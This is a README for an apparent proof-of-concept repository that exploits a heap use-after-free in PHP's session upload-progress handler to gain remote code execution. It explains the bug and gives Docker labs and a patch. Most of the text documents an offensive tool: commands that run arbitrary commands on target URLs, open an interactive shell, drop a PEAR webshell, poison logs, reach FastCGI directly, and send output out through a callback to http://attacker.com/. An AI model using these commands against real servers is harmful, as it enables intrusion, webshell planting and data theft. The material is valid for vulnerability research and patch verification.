<!-- GitAds-Verify: M6GZ4VLQ7VQKZG9AG2DO6O2M5IN4JO1Z -->
# php2shell — CVE-2026-109618 / CVE-2026-109619 PoC

> **Heap Use-After-Free in PHP `session.upload_progress`**  
> CVSS 9.2 · PHP 5.4.0 – 8.2.34 / 8.3.35 / 8.4.26 / 8.5.11

This repository contains:

| Component | Purpose |
|-----------|---------|
| `poc.py` | Full RCE exploit chain (session poison + LFI, log poison, FastCGI no-LFI, PEAR webshell) |
| `lab-uaf/` | Docker lab that reproduces the UAF primitive on PHP 8.4.4-fpm |
| `lab/` | Apache-based lab for testing the session-poison + LFI RCE chain |

---

## Vulnerability

PHP's `ext/session/session.c` rfc1867 upload-progress handler caches raw `zval*` pointers into the session HashTable (`arData`) at lines 3292 and 3318. When a multipart upload stalls longer than `session.upload_progress.min_freq` (default 1 s), a second `FILE_DATA` event triggers `php_session_rfc1867_update()` → `php_session_initialize()` → `php_session_track_init()`, which **frees the HashTable** (lines 236–252). The cached pointers now reference freed `arData` slots. The next write at lines 3331–3332 (a `ZVAL_LONG` that stores `bytes_processed`) writes through those stale pointers — a classic heap use-after-free.

### Affected versions

| Branch | Vulnerable through | Fixed in |
|--------|-------------------|---------|
| PHP 8.2 | 8.2.34 | **8.2.35** |
| PHP 8.3 | 8.3.35 | **8.3.36** |
| PHP 8.4 | 8.4.26 | **8.4.27** |
| PHP 8.5 | 8.5.11 | **8.5.12** |
| PHP ≤ 8.1 | all | no backport — EOL |

### Root cause (session.c)

```c
// session.c:3292 — pointer cached into HashTable arData
ZVAL_LONG(&tmp, 0);
zend_hash_str_update(Z_ARRVAL_P(post_bytes_processed), ..., &tmp);   // <-- cached zval*

// ... stall > min_freq ...

// session.c:236-252 — track_init() frees the HashTable
zend_array_destroy(Z_ARR_P(session_vars));   // arData freed here

// session.c:3331 — write through stale cached pointer (UAF)
ZVAL_LONG(post_bytes_processed, new_bytes);   // stale pointer write
```

---

## UAF Lab

Reproduces the stale-pointer write on stock PHP-FPM (no ASAN, no debug build).

### Requirements

- Docker + Docker Compose
- Python 3.8+

### Quick start

```bash
# Clone and enter
git clone https://github.com/syrex1013/php2shell
cd php2shell/lab-uaf

# Build and start
docker compose up -d --build

# Run the PoC (5 rounds, session monitor enabled)
python3 scripts/php2shell_poc.py --monitor --rounds 5
```

Expected output:

```
── Round 1/5 ──
    SID:     a043365f3b8b4cc6a5632fdefa8d1643
    Status:  200 OK
    Armed:   YES — bytes_processed = 5331
    ► Cached zval* pointers were written through (stale path reached)
```

### PoC options

```
python3 scripts/php2shell_poc.py [OPTIONS]

  -t HOST   Target host (default: 127.0.0.1)
  -p PORT   Target port (default: 19268)
  -s SEC    Stall duration in seconds; must be > min_freq (default: 1.5)
  -r N      Number of trigger rounds (default: 1)
  -m        Monitor mode — read session mid-stall to confirm arming
  --spray N Heap spray: N dummy 256-byte file parts to exhaust the ZendMM
            bin before arData is freed, raising the probability that the
            stale write hits a live zend_string (type confusion → crash)
  -v        Verbose
  --verify  Verify lab configuration before triggering
```

### How the exploit works

```
Phase 1: POST multipart with PHP_SESSION_UPLOAD_PROGRESS
         └── rfc1867 callback fires → caches zval* pointers into arData

Stall:   > session.upload_progress.min_freq (1 s)
         └── next callback re-runs php_session_initialize()
             └── php_session_track_init() frees the HashTable (arData freed)

Phase 2: second FILE_DATA chunk sent over same TCP connection
         └── ZVAL_LONG writes through stale cached pointer (UAF write)
```

### Heap spray mode

With `--spray N`, `N` dummy file parts with 231-character filenames are prepended. Each filename becomes a 256-byte `zend_string` (24-byte header + 231 chars + 1 null = 256 bytes), matching the size of the 8-entry session HashTable `arData` (8 × 32-byte `Bucket` = 256 bytes). Exhausting the ZendMM 256-byte bin forces the freed `arData` chunk into a different slab path, increasing the probability that the stale write corrupts a live allocation rather than silently hitting the re-allocated `arData`.

```bash
python3 scripts/php2shell_poc.py --monitor --rounds 10 --spray 16
```

---

## RCE Exploit (`poc.py`)

Full exploit chain with multiple fallback paths. Requires a PHP web application running a vulnerable PHP version.

### Usage

```bash
python3 poc.py <url> <command> [OPTIONS]

# Session poison + auto-detected LFI
python3 poc.py http://target.example.com/index.php "id"

# Specify LFI parameter
python3 poc.py http://target.example.com/ "id" --lfi-param page

# Interactive shell
python3 poc.py http://target.example.com/ "id" -i

# Blind callback (no LFI needed on target side)
python3 poc.py http://target.example.com/ "id" --callback http://attacker.com/
```

### Exploit chain (ordered by reliability)

| Stage | Method | Requirements |
|-------|--------|-------------|
| 1 | Session poison + LFI | App has `include($_GET[...])` or similar |
| 2 | Log poisoning + LFI | Apache/nginx write access log readable via LFI |
| 3 | FastCGI direct (no LFI) | php-fpm port reachable (9000–9003) |
| 4 | PEAR webshell drop | `/usr/share/php/pearcmd.php` accessible |

### Options

```
positional:
  url                    Target URL
  command                Command to execute

optional:
  --lfi-param PARAM      Known LFI parameter name (auto-discovered if omitted)
  --rounds N             Upload rounds per attempt (default: 3)
  --chunk-size N         Upload chunk size in bytes (default: 128)
  --chunk-delay SEC      Delay between chunks (default: 0.01)
  --modes {session,log,fastcgi,pear}  Comma-separated mode list (default: all)
  --probe-only           Only check if target is vulnerable, don't exploit
  --no-verify            Skip SSL certificate verification
  --cafile FILE          CA certificate file for SSL verification
  -i, --interactive      Drop to interactive shell on success
  --callback URL         Blind callback URL (exfiltrate output via HTTP)
```

### Lab (Apache + LFI)

```bash
cd lab
docker compose up -d --build

python3 ../poc.py http://localhost:8888/index.php "id" \
    --lfi-param page \
    --chunk-delay 0.01 \
    --chunk-size 128
```

Expected:

```
[+] RCE confirmed via session+LFI
COMMAND OUTPUT: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Mitigation

### Immediate (no patch required)

```ini
; php.ini
session.upload_progress.enabled = Off
```

### Patch

Update PHP to the fixed release for your branch (8.2.35+, 8.3.36+, 8.4.27+, 8.5.12+).

The vendor fix removes the long-lived `zval*` cache in `php_session_rfc1867_callback()` and re-derives the target pointer on each write instead of caching it across the stall window.

---

## References

- CVE-2026-109618 — `post_bytes_processed` stale pointer (session.c:3292)
- CVE-2026-109619 — `current_file_bytes_processed` stale pointer (session.c:3318)
- PHP bug tracker: bugs.php.net (patch committed 2026-09)
- Original research: Ahmed Sultan (0x4148) — jackalsyn.com/posts/php-up-2026.html

---

## Legal

This code is for authorized security testing, research, and education only. The authors are not responsible for any unauthorized use. Run this only against systems you own or have explicit written permission to test.

Licensed under the [MIT License](LICENSE).

## GitAds Sponsored
[![Sponsored by GitAds](https://gitads.dev/v1/ad-serve?source=syrex1013/php2shell@github)](https://gitads.dev/v1/ad-track?source=syrex1013/php2shell@github)

